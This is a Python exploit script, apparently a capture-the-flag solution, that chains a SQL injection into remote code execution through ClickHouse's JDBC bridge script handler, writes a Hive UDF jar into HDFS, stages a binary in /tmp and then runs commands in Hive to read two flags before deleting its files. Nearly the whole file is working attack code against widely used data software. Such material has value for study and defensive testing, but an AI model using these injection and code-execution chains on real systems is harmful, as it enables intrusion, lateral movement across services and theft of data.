import requests
import base64
import re
import json
import sys

def tohex(s):
  return ''.join("{:02x}".format(ord(c)) for c in s)

def ch_jdbc_sql(s):
  return "jdbc('jdbc:clickhouse://127.0.0.1:8123', '" + s.replace("'", "\\\'") + "')"

def query(s):
  a = requests.get(sys.argv[1], params={
    "query": "1=0 union all select results, '2', '3', '4' from " + s
  })
  text = a.text
  try:
    return json.loads(text)[0]['userid']
  except:
    return a.text

def rce_in_clickhouse(c):
  sql = "jdbc('script:', 'var a=new java.lang.ProcessBuilder(\"bash\",\"-c\",\"{{echo,{}}}|{{base64,-d}}|{{bash,-i}}\"),b=a.start(),c=b.getInputStream(),sb=new java.lang.StringBuilder(),d=0;while ((d=c.read())!=-1){{sb.append(String.fromCharCode(d))}};c.close();sb.toString()')".format(base64.b64encode(c.encode('utf-8')).decode('utf-8'))
  return query(sql)


def step1():
  print('====== STEP 1: RCE in clickhouse-jdbc-driver ======')
  flag = rce_in_clickhouse('/readflag')
  print(f'FLAG1: {flag}')

def step2():
  print('====== STEP 2: Upload hive UDF to HDFS by clickhouse ======')
  udf = open('udf.jar', 'rb').read().hex()
  sql1 = ch_jdbc_sql("CREATE TABLE hdfs_test (name String) ENGINE=HDFS('hdfs://namenode:8020/a.jar', 'Native');")
  sql2 = ch_jdbc_sql("INSERT INTO hdfs_test SETTINGS hdfs_create_new_file_on_insert=TRUE VALUES (unhex('{}'))".format(udf))
  query(sql1)
  query(sql2)

def step3():
  print('====== STEP 3: Upload hive client to clickhouse ======')
  ch_to_hive = open('./clickhouse-to-hive/clickhouse-to-hive', 'rb').read()
  ch_to_hive_parts = [ch_to_hive[i:i+4096] for i in range(0, len(ch_to_hive), 4096)]
  for i, r in enumerate(ch_to_hive_parts):
    # Cannot direct append because script will be executed twice
    s = base64.b64encode(r).decode('ascii')
    sql3 = "jdbc('script:', 'var fos=Java.type(\"java.io.FileOutputStream\");var f=new fos(\"/tmp/ttt{}\");f.write(java.util.Base64.decoder.decode(\"{}\"));f.close();1')".format(str(i), s)
    query(sql3)
  sql4 = "jdbc('script:', 'var File=Java.type(\"java.io.File\");var fos=Java.type(\"java.io.FileOutputStream\");var fis=Java.type(\"java.io.FileInputStream\");var f=new fos(\"/tmp/ch-to-hive\");for(var i=0;i<{};i++){{var ff=new File(\"/tmp/ttt\"+i.toString());var a=new Array(ff.length()+1).join(\"1\").getBytes();var fi=new fis(ff);fi.read(a);fi.close();f.write(a);}}f.close();')".format(str(len(ch_to_hive_parts)))
  query(sql4)
  rce_in_clickhouse('chmod +x /tmp/ch-to-hive && rm -rf /tmp/ttt*')

def step4():
  print('====== STEP 4: RCE in hive ======')
  hivesql1 = "/tmp/ch-to-hive \"create function default.v as 'udf.Exec' using jar 'hdfs:///a.jar'\""
  hivesql2 = "/tmp/ch-to-hive \"select default.v('/readflag')\" 2>&1"
  rce_in_clickhouse(hivesql1)
  print('FLAG2: ' + rce_in_clickhouse(hivesql2))
  rce_in_clickhouse('rm -rf /tmp/ch-to-hive')

step1()
step2()
step3()
step4()
